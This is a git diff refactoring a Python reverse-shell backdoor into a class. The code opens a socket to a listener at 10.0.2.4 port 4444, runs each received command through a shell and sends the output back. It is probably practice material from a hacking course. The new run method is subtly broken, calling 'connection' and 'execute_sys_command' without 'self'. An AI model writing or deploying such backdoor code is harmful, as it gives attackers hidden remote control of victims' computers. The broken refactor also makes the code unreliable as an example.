@@ -3,17 +3,23 @@
 import socket
 import subprocess
 
-def execute_sys_command(command):
-    return subprocess.check_output(command, shell=True)
+class Backdoor:
+    def __init__(self,ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # connection.connect(("10.0.2.4", 4444))
+        self.connection.connect((ip, port))
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("10.0.2.4", 4444))
+    def execute_sys_command(self, command):
+        return subprocess.check_output(command, shell=True)
 
-connection.send(b'\n[+] Connection established. \n')
 
-while True:
-    command = connection.recv(2048).decode()
-    command_result = execute_sys_command(command)
-    connection.send(command_result)
+    def run(self):
+        while True:
+            command = connection.recv(2048).decode()
+            command_result = execute_sys_command(command)
+            self.connection.send(command_result)
 
-connection.close()
+        self.connection.close()
+
+my_Backdoor = Backdoor("10.0.2.4", 4444)
+my_Backdoor.run()
